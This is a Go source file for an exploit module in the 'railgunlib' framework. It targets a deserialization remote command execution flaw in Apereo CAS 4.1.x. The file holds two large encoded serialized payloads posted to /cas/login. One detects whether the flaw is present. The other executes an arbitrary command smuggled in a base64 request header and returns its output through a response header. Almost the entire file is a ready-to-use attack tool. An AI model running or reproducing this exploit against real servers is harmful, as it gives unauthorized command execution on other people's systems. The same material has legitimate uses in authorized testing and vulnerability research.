package ApereoCAS

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_Deserialize struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Deserialize) GetMsg1(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `execution=uuid_AAAAIgAAABByQvrQuvRN0%2BsVisxYY%2FeCAAAABmFlczEyOCDzQSw3YRCkKYhgqq%2FkuQbcL8J5tp1ZEO3I1ZpDV8lIeNOmBXTNPcrEG%2B6ioEDwvrmHG83dwNUaxXX5IjBbiOsVpiXYiwu%2BPMWVC7%2Bhu7gV1e9VD%2FIV9kGnto9WZufKDDiOA39CXjF1NH5AUfJTKrhobY47w7wGDEUlevC%2Be%2BL1u1jxd4Em0%2BDYH2ZnpH7TgmtojUG4lRQSPKKvv0fmi2Seaomstx5mBGcfUdmNvC3jWJLma0c8QMK4WRP4geMQrZWDCVKvrbUtpyzZMpxecITI96IoPvHZWI%2FskyHc3t4ziGKiP7spbRy494k%2BMJlgDnMPsNiUkqyVOUOs0ofuOdkJqQ1qkiySo21RmXrf3Htq1WpOrJeVnhkTnXK2vV063NYNrLLTAcrQqyVAu%2Bz3SFuPTJuCErl5%2BSXCARyA7VFo%2BN6qt5GCx8UXGUjG%2B0Z2lSAHRuDAbjKe7dNZygzUiHQ4WVFSGIQnmyr9FMyVphpWbEOFm73G0Ic54mu3Xx3dfgFOz%2Byi%2BqxkXiN4e0CjKkmWAwxCBD4rwY98sD%2FBm6MW7yUge1KC8MqVBuerkIb5278b7uU3xyobLkyoAYmdNegFasfjt6cmKIgOUsJBSwT%2BK%2FmRnk4tFACQ3G%2BjZDkwcG7h%2FKq9PjLI%2F59fbZnRrI7uxGXB1UTbbn%2BzLX4%2FRawen3fs7RTFwHCLtLF5oQDFBurPDHxDb5HuryIvPrFW4YTowJDUsuAPttzkETs%2FgEUIJbbs8%2BlIVPITipYJhcCMvu4skbeXnUAjyEA8ajV%2Fi5EDiq9KmoZf0VTks57XccanntMiUNvBXgRxqpVNDC4BFZz3NhxPORXS0IsgK0OLjhMohj7ywDAuSr6E%2FeplNEyh76Vjx%2BLGVcnbzn8DI0RmLjNxi0MiPcYfDF38gWdGxbsXUHOMcUrp4cMpP%2Bz5baBhDsN9rznpYEYitpd0kwFouNTDM5HwUQwoijZdaJw4tWGhb2mDom68ZKZAT1jDdlPJLhUtiVRo5vl1hIoIY08hLTioSO90kPHSuKJ9t9MrxLok1THlUPGCLxfyRYvxT1vjRLQs2bkvYQEnPlklfoUaKFtLRY3aQ5Tjd3rn99x0K9SE0ddJPRBbG%2FgUB89wRVHs1LDo8Fuu9dy3M5BnlFOVwDzxb5jBhus5PHGq87ruCnizi2BBJtVr96%2FLy%2FUtqGutZccznVAh%2Bjd2LfhWj%2BgbfJqT8onhWsWa5LyvBEakbCdXxK5p%2BlGrJ%2FeuPNLoYRDBdGVtrcFC7H7HCP4a3wAh6iYGY%2B5zRCc7VZRA2rnHySflrR586vLIedhi1spRiuP8U9VA8yXuAcVezpHvaWYPJLU1uiwXQwEkwSYKUZxyoWnxPEv7pFnyt95r9fYTLeaN%2FLZXCjaAE9Y0cKMmrxYwEQDX2aNkDQepZgNsIx2Qd752IKdBW3RpKyVZKj43WKs4pAeYfPPWePSss5Q4BB89OTJFxgVsIzAlTpLSyfQf%2B28KSkPwFU%2FbVIK83d5wpAwJMP0mHh8OtRSbuaGq3%2BPb73m2a7NurEitgQdD7lyYyx9vSKZbdFSoMLGE4iiQff1WcqvPPo32SMkm%2Bpwqk%2BM4JSRDSkeCm2dhqOQDAEJIuR7H9OC%2Fur66sgtqGo3nzQGS6%2FthCYk0D5Cp2oilMLUAsfR3KHLb1AWs1LDJ3wwCKKkbAjZnBQ2R0%2FRvobsjGcLAnTOOcSejCIucjJbsr%2BSsLVFUvk3pKOcGFhVUGRFu8e3aC65EUSZjTMGGhrYR%2FRjUzS7Kq9Qbg70mx65cq%2FAVxAnjLa0Q07%2FmaV4E5QomHMhm65dQCFcreLumzgsmeRKdtgMSHol3zswlsBM%2BxZt7mGG%2BwF2K0g2%2FUZQbfwM5aKIFj7G6qN90ttMm%2Fj1HFR8xXrUAE%2F%2Btn4cMFeXmi8F69BBR9P3IQ9PmJugioQ83WbLOqoPr8WM0XK00NirmVS5XVPk9ZtLXbrKadUu8vs6Eb83EMERydxNAsA1L5dZMrjuQaDwnvjtIcQUixN07YSJ1ZEXF166b5L3sWipa9zIx3e5S0Vcf0ZFFbDuRHTMKqUhZRzIeUwE6xxfCnQVJXp3woufHgDgb6E%2F0nmgE6RzpwEWIGbvcNze6QpY9JHhJYSQfn1OpByOIEQ8DqV1dm9KwNleY06y%2FMVPIbButVYt1titvXWr0Txqp%2FJpYK5XgfwvYus9VbYLFYpm7qz7pCqix`
	uuid := goutils.UUIDv4() //生成随机uuid
	payload = strings.Replace(payload, "uuid", uuid, 1)

	//发送请求
	httpresp := self.HttpPostWithoutRedirect(self.AddUri(self.Params.Target, "/cas/login"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get("Transfer-encoded") == "chunked" {
		self.EchoInfoMsg("漏洞存在！")
	} else {
		self.EchoErrMsg("漏洞不存在！")
	}

	return
}
func (self *Exp_Deserialize) Cmd1(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `execution=uuid_AAAAIgAAABByQvrQuvRN0%2BsVisxYY%2FeCAAAABmFlczEyOL7%2F60tm1tw6fECSfPJOqhEMxX0mVHpGUlj3ljKopf6%2FfO6Bh5T9x0xSHuOHz9on%2FDKnYojZyQWY3iHlElUqk2eDSq%2B5Y6GqPfwUoAB0H8F5EJsgztC61jmTqCgQe1YgM005oDUG3J%2BKdnjo3SSu6uqEAi3N1FGCLNr%2BONax7z%2BKT0x6ce%2FITjHWx1bki5X5JmIa4f5YPEZTzwN1W%2FlijOfr34HLSZkzzX3x43%2Bf5TolSPdGVrTvD7wTVYTU3ji4xzjV5GNRjJNNGsxz4fDFCjrZx4Z2nHGWbz9shxOL7LGfDUNfKs4kBScCuX10pLFvQ5u8gNydcbSmg6yltJnYodKBWTVZY15hDXoQz4KQeNwhCMB0Ca4GDmAcPd2Yb6mbmNZ8EtlF9bTdvdxakR45TxoZcNDQZcaJj9rgMMOcvJ6bqRUveI%2Bu8HJnNQOSjSQt7u8BXSDqShvKL0jwV5CJ75ahNQxmw%2FHnrDh0htOh2A%2FZjVRzzS9cXviSFCv9bSysOCwBBfE48SiJBGjSA3sjWACAiXG6lRZojHuLHLYlSqn5VecJvVmXNPcAuH5dArrQheuMa%2FaQll%2FigQ%2BccvhPa77CJfPNvz%2FncoSyyNoRdzrhWGYYGInbbEtEd5D8tPnsZ3Fl1Y613QVSdP62SlqmD2e5IoR3Pkha4%2BK6dttsoQFfDgdcf8UiFSCmIYFH700ZdwuaEgkxrt5e6mZfqgJ3XTf%2FzTudUEP%2FRFeQGGayi0ch8dvFcR4mdAg5JNfJctXCs23EtMUmo2jBCCFfUD9NCCKFZtzFu1fVeDMrWSAHkY6%2F9Xk33dIsI59NBVgdxHlFvJHxbyYilHIus1Zbv7AMAoZ7PRJ6KPjZ3HzzZlKeQ4hpOiAn5w5M5kp7amtrmOxzbIL1WPZxOTHk%2BOw57eCcYctdYwFeXER9kpIsiHwk9sP%2FyD9PoKcXKf7EElokEojDPAq7Ej7HaSimr2Bv7sppuF80Gh%2FQwYZ02rE%2FPMHtoy%2FXEOEogqXzw%2BKt7c7ttAdb8NRaRIDlkGGGTJxVIEDyRY7C0LppVLT8KdFgWG7bu7Eu1CnHWR%2FbCe7LmFwNhbIN7kpr3SI3ALiF1XPUWGsQd28%2F0Oi4F%2BKcZjL6fykyhQ9szr2CJdsIWYFLTPwsVt5ZcJleLE%2FSJ9nme%2FpAw%2FoamUNvydnMkpuNEghjLf30DtZg1FzRhXtMXGXEyhpJD48c5xWWAqQwdrTih6hRIkJvCtsrfCTsWu6yZGQH92gd5NCqminenpT8J%2BYE0l%2F%2FB5%2F8M9t0xGVkwUzy0vZ5qRvp1HRpqpDlDM7g0lHGyavYFg9mmqH29x5b3PVBwAXEPUiQrZkP9Uvr4IokZruKuX0wppsfqYm9fixAONGxhoyhtEwkxxMKba8I%2FQLBA2GzfaqnLUEGBA3q5BnDuxao6K0jifGSenEbXh1egNqqZMpe8P27%2FWhHQrxeu1XUTpRwVJjQWNWNP2ede1CaNvnrimlva0qNz08Nm3nY%2F0DMsjMnCPx%2BUKZgdmNQrnEjGuNNHcLQdcwNkwFlaO%2BYRekEer%2BpxAfQAJ2z2f%2BfOfRYdfhV1dRy%2F%2Fa%2BI5ZSmh63y41z%2BA2q6n9NQbGAS2r7EaaRIIibwSzGQ%2Bl%2BoyB7Gi6Y%2FyMSRXtMoZtW%2BEmaltLW81q4xLAHjO9D0XegSUg8TVQ91JrYaYC%2FWDEoDnG21wavWuxSBSAlo0FyzWu0gIGZg84cqRl2UVfPtsXHIhnJfJMWZk6dhiqD7Q7MJfT9U0t71RAFtQhzRDndyQi1YRq%2FiQ8BmmNHQlXaUGSKvSpyHd7NU%2BtIogu0hnVKn5NMpzm4CC54OO14D9L7QY%2Fbm1%2F1xxTtYQAMmB55uYcCb%2BsFq2HJxwADbqTumTeSIaMd%2BNN2yoWXv%2F%2BPWFw8z3r0jkstkB5O1EVcJREybeUNcMDD0icNSi2fIMaw2dFukdzLgoP3vwU2ncDEOyqsurErE2cdei6YcA7Ui0s1AP8rAmih0cR8ZyJRIoCSzFzwkb2eooAeAksi9GE1i8PQumqHJvNd%2BsoTjDkF4irhSXa3oFF9r5EYXmf%2Bz7cWQ224qRZUjHDVlGHTOKw0lE0SZO%2Fra6M9yrWsB96OJoY2%2BoYhE7oHGM7QhQTp1jIF6%2Baet1nUNNfPyPzKkrtXMIR9VBrS0mjs7m%2Fz7YnCxXnDcygayV5s02rlSC1BxA4cp5CDRPLFN85lm28UG7arDqf3%2BF7hV1jpcKgfrR5%2FbjKthx%2BYbGxBd9l1PXGB51qMF2Qbas%2BYKrUCYV3HM9iGIbMSZGRZhRyx%2FXvo9mhuvwYQBuhn4Kp%2FHdC9X4IxWJmKmoBoQ89X8vGNMrDOwq9V8ZVrDg7CYMCAK7bAXCq8nj99RFN7wt4FzyoTGV9juOEEk%2BZ6YflbbnBn2GNnIfZY0V48kswS6VUZtEwI%2FhW278VmTTIYgkSV0OfRwF41BA%2BR1dSQkbZ3pA6QiORd7wqtWtqSqlABusZ0OCmwMLhJrwZEmeTCamcsOyXw3QI4p8UVZZsWXlN9Y29JSzwUJrDrdhp2gu3cdbPuU2i%2BFgWDcV4%2B%2BoosapM%2BVwaL24f2bhe5j6Xdvz9XuExKzzD1GyjJgAYwP0%2Bz94zEAiuQDCY39ipgzsxvU%2BA2XrxXDRcDZChT%2BWrlrm0NHcXfWgl8D8fPLwLaxxsbYSWrQhTO7CXBp2wMnN8NtJB2CKKuC76DB4Ch0ByhooLu8QgTPAZ3%2Fh8HnSkSRuDyKdDMapJtyE777i%2BGgvZJ4BdNCgeptPYGZblGXMRIsVriWYmIcT7qjr0gYmaHuqfGfVot%2BfKQb07q%2Fa6yj7MBEvmqHShh6G%2B6TzEFrd4Ekedb8S%2FrVvwMbzuaLzdbzP4T8SQ3OOoS0sV29e4J2Tmojq%2F1kzOhT%2BKGx5T67GoMjF90KEgSQAjjm7pZkR0PGUHAi7kRc4kauLsNI%2F4sOvJxj15pMNpbY1BvfJD58ZS3BWqqkKkxV8aoKxl6feIYCH88pQnmczXAsU1ZTr0jzEtIb4dFCt%2BIzsYwUwtaNh44YmeNaX0iddzK3JUqpGw8eu0%2F1oVcMxrgj0ThkbJB3J5EbUHF%2BKNFTFIgylW8ji3S1UZwFIZsIhXkOFoMu%2BRNO8Wh6MoDcwZCEvs31F7eU5IrEIGYHSsavtMu6%2F8ptDyumvvjKmuPuX%2FVKjyZOa4NPDdiP6X1YN41j0H85hsTWIgc5C88pOSuzh19UsSy5yLcGFrYlZEzESR7sbptATghGEqwMpUnrirQJQZOfuhw3iSfeRBp8sbYJyL2Vlje9mXo8CW5dWnCcE9%2BBx12Hybf8OqgoYvnpph2%2BY33xzlFYUhhEG%2Bdio6%2FeZbUeWu6hZvk62nw%2BhhNCq3qL4zr%2FOu8kEH153R5mQgVu5uwk5ItxQ%2BzJ%2BwvFLfb0UDuGVJBxLf55iwHgnZ%2B2yxzHMNc75%2BOPe0CEGlqPZNDdfFf%2BD4xehHrLgT8scmxLujLSh4ArJ2HhET51SPYefVR8uDnIPBlpMxIECvmH2AZdM1dtg%3D%3D`
	uuid := goutils.UUIDv4() //生成随机uuid
	payload = strings.Replace(payload, "uuid", uuid, 1)
	base64cmd := base64.StdEncoding.EncodeToString([]byte(cmd))
	headers.Add("Accept-Encoded", "a"+base64cmd)
	//发送请求
	httpresp := self.HttpPostWithoutRedirect(self.AddUri(self.Params.Target, "/cas/login"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get("Transfer-encoded") == "" {
		self.EchoErrMsg("执行失败！")
	} else if httpresp.Resp.Header.Get("Transfer-encoded") == "a" {
		self.EchoErrMsg("执行成功，但未获取到回显！")
	} else {
		base64result := strings.TrimLeft(httpresp.Resp.Header.Get("Transfer-encoded"), "a")
		result, _ := base64.StdEncoding.DecodeString(base64result)
		expResult.Result = string(result)
	}

	return
}

func init() {
	expmsg := exp_model.ExpMsg{
		Author:   "小晨曦",
		Time:     `2022-07-17`,
		Range:    `Apereo CAS 4.1.X ~ 4.1.6`,
		ID:       ``,
		Describe: `Apereo CAS 4.1 反序列化命令执行漏洞`,
		Details: `
获取信息：无损检测漏洞是否存在。
`,
		Payload: `
POST /cas/login HTTP/1.1
Host: your-ip
Content-Length: 2287
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/cas/login
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
Connection: close

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
[payload]替换为p牛工具生成的。
`,
		VulType:   common.VulCmdExec,
		Reference: `https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md`,
	}
	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
	}
	exp_register.ExpStructRegister(&Exp_Deserialize{}, registerMsg)

}
